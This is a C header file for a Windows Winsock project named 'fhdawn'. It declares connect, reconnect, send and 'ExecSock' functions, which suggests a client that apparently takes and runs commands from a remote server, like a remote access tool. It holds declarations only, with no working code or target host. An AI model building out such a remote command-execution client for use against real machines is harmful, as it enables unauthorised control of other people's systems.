#ifndef __FHDAWN__H__
#define __FHDAWN__H__


/*
Author: Fahad (QuantumCore)
fhdawn.h (c) 2020
Desc: Main header file 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <iphlpapi.h>

#define BUFFER 1024

static BOOL connected = FALSE;

struct sockaddr_in server;
SOCKET sockfd;
char recvbuf[BUFFER];
//=====================
void ReportError(void);
void WSAReportError(void);

//=====================
int sockprintf(SOCKET sock, const char* words, ...);

// Start Winsock
void StartWSA(void);
void fhdawn_main(void);
void MainConnect(void);
void sockSend(const char* data);

void ExecSock(void);
const char* IP2Host(const char* IP);

void REConnect();

#endif  //!__FHDAWN__H__